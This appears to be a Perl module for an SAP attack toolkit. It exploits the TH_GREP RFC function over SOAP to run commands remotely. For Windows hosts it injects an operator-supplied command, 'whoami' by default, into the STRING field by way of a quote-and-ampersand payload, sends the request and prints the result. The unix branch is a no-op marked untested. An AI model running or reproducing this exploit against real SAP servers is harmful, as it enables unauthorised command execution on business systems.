#!/usr/bin/perl
# Module Command execution (TH_GREP)

# CONFIG
######################
my $desc ="Command execution (TH_GREP) \n\t Usage: black.pl .. .. $argv[5] <OS_type> [command]\n\t <OS_type> - SAP's OS: windows or unix(!untested!)\n\t [command] - command to execute, default is WHOAMI\n"; 
our $funcName="rfc_th_grep_Func";

######################
push(@descriptions,$desc);
push(@functions,$funcName);
######################


# Special function
######################

sub rfc_th_grep_Func()
{

	my $XML='<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
	<SOAP-ENV:Body>
		<m:TH_GREP xmlns:m="urn:sap-com:document:sap:rfc:functions">
			<RESULT>
				<item>
					<LINE>test</LINE>
				</item>
			</RESULT>
			<STRING>
			</STRING>
		</m:TH_GREP>
	</SOAP-ENV:Body>
</SOAP-ENV:Envelope>';


	if ($ARGV[$m_arg_i+1]=~'unix'){
		$XML=~s/<STRING>/<STRING>/s;
	} elsif ($ARGV[$m_arg_i+1]=~'windows'){
		$XML=~s|<STRING>|<STRING>aaa" -? &amp; %COMMAND_NAME% &amp; whoami|;
	}
	else{
		print "Please, choose OS type";
		exit;
	}
			
	if ($ARGV[$m_arg_i+2]){
		$cmd=$ARGV[$m_arg_i+2];
		print $cmd." - cmd \n\n";
	} else {
		$cmd='whoami';
	}
	
	$XML=~s/%COMMAND_NAME%/$cmd/s;
	
	#print "$XML\r\n";
	
	my @answers=send_soap($XML,1);

	my $answer=join('', @answers);

	print "$answer\r\n";


	print "\n\n";
	
}